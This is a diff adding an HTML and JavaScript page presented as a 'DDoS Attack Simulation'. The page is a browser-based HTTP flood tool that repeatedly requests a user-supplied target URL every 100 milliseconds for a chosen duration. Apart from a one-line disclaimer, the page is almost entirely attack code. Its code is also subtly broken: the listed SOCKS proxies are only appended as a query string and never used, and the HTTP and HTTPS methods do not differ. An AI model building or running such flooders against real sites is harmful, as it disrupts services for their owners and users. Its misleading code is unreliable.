@@ -1,0 +1,84 @@
+<html>
+<head>
+    <title>DDoS Attack Simulation</title>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+</head>
+<body>
+    <h1>DDoS Attack Simulation</h1>
+    <p>This is a simple program to simulate a DDoS attack using HTML and JavaScript.</p>
+    <p>Please do not use it for any malicious purposes.</p>
+    <form id="attack-form">
+        <label for="target-url">Target URL:</label>
+        <input type="text" id="target-url" name="target-url" value="http://example.com" required><br>
+        <label for="proxy-list">Proxy List:</label>
+        <textarea id="proxy-list" name="proxy-list" rows="10" cols="50" required>socks5://127.0.0.1:1080
+socks5://127.0.0.1:1081
+socks5://127.0.0.1:1082
+socks5://127.0.0.1:1083
+socks5://127.0.0.1:1084</textarea><br>
+        <label for="attack-method">Attack Method:</label>
+        <select id="attack-method" name="attack-method">
+            <option value="http-flood">HTTP Flood</option>
+            <option value="https-flood">HTTPS Flood</option>
+        </select><br>
+        <label for="attack-duration">Attack Duration (seconds):</label>
+        <input type="number" id="attack-duration" name="attack-duration" value="10" min="1" max="60"><br>
+        <input type="submit" id="attack-button" value="Start Attack">
+    </form>
+    <div id="attack-result"></div>
+    <script>
+        // Define a function to send a request using a proxy
+        function sendRequest(targetUrl, proxyUrl) {
+            // Create a new image element
+            var img = new Image();
+            // Set the image source to the target URL with the proxy URL as a parameter
+            img.src = targetUrl + "?proxy=" + proxyUrl;
+            // Append the image element to the attack result div
+            $("#attack-result").append(img);
+        }
+
+        // Define a function to start the attack
+        function startAttack() {
+            // Get the target URL from the attack form
+            var targetUrl = $("#target-url").val();
+            // Get the proxy list from the attack form
+            var proxyList = $("#proxy-list").val().split("\n");
+            // Get the attack method from the attack form
+            var attackMethod = $("#attack-method").val();
+            // Get the attack duration from the attack form
+            var attackDuration = $("#attack-duration").val();
+            // Set a variable to store the start time of the attack
+            var startTime = Date.now();
+            // Set a variable to store the number of requests sent
+            var requestCount = 0;
+            // Set an interval to send requests every 100 milliseconds
+            var attackInterval = setInterval(function() {
+                // Loop through the proxy list
+                for (var i = 0; i < proxyList.length; i++) {
+                    // Send a request using the current proxy
+                    sendRequest(targetUrl, proxyList[i]);
+                    // Increment the request count
+                    requestCount++;
+                }
+                // Check if the attack duration is reached
+                if (Date.now() - startTime >= attackDuration * 1000) {
+                    // Clear the interval
+                    clearInterval(attackInterval);
+                    // Display the result of the attack
+                    $("#attack-result").html("<p>Attack finished.</p><p>Target URL: " + targetUrl + "</p><p>Attack Method: " + attackMethod + "</p><p>Attack Duration: " + attackDuration + " seconds</p><p>Requests Sent: " + requestCount + "</p>");
+                }
+            }, 100);
+        }
+
+        // Add an event listener to the attack form submit button
+        $("#attack-form").submit(function(event) {
+            // Prevent the default form submission behavior
+            event.preventDefault();
+            // Clear the attack result div
+            $("#attack-result").html("");
+            // Start the attack
+            startAttack();
+        });
+    </script>
+</body>
+</html>
